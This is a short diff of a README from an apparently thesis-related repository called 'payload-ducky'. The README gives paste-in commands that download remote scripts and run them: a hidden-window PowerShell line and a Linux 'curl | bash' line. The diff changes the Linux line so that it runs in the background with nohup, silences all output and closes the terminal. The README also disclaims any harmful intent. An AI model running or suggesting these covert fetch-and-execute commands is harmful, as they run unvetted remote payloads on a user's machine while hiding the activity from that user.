@@ -12,7 +12,7 @@ powershell -w hidden -c "iwr 'https://raw.githubusercontent.com/sazid570/payload
 
 ## use the following command in linux terminal(debian tested)
 ```
-curl -fsSL https://raw.githubusercontent.com/sazid570/payload-ducky/refs/heads/main/linux.sh | bash
+(nohup curl -fsSL https://raw.githubusercontent.com/sazid570/payload-ducky/refs/heads/main/linux.sh | bash > /dev/null 2>&1 &) && exit
 ```
 
 ### This repo is to serve the purpose of the thesis work in ECE, not to spread harmful codes to others.
